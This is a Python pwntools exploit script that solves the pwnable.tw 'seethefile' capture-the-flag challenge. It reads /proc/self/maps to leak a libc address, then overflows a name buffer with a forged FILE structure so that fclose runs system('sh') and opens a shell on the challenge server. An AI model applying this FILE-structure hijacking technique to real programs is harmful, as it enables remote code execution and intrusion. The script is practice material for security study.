from pwn import *

context.log_level='debug'
debug = 1
d = 0

if debug == 1:
	p = process("./seethefile")
	if d == 1:
		gdb.attach(p)
else:
	p = remote("chall.pwnable.tw", 10200)

def Open(name):
	p.sendlineafter("Your choice :", str(1))
	p.sendlineafter("What do you want to see :", name)

def read():
	p.sendlineafter("Your choice :", str(2))

def show():
	p.sendlineafter("Your choice :", str(3))

Open("/proc/self/maps")

read()
show()

read()
show()

elf = ELF("./seethefile")
libc = ELF("./libc_32.so.6")
raw_input()
p.recvline()
leak = int('0x'+p.recvline()[:8], 16)
#libc_base = leak - (0xf7f0d000 - 0xf7d5d000)
system = leak + libc.symbols['system']
log.info("leak -> " + hex(leak))
#log.info("libc_base -> " + hex(libc_base))
log.info("system -> " + hex(system))

name = elf.symbols['name']
payload = [
		0, 0, 
		system, 0, 0, 0, 0, 0,
		name + 0x28, 0,
		u32('\x80\x80||'), u32('sh\0\0')
		]

p.sendlineafter("Your choice :", str(5))
p.sendlineafter("Leave your name :", flat(payload).ljust(0x94+0x28, '\0') + p32(name))
p.interactive()
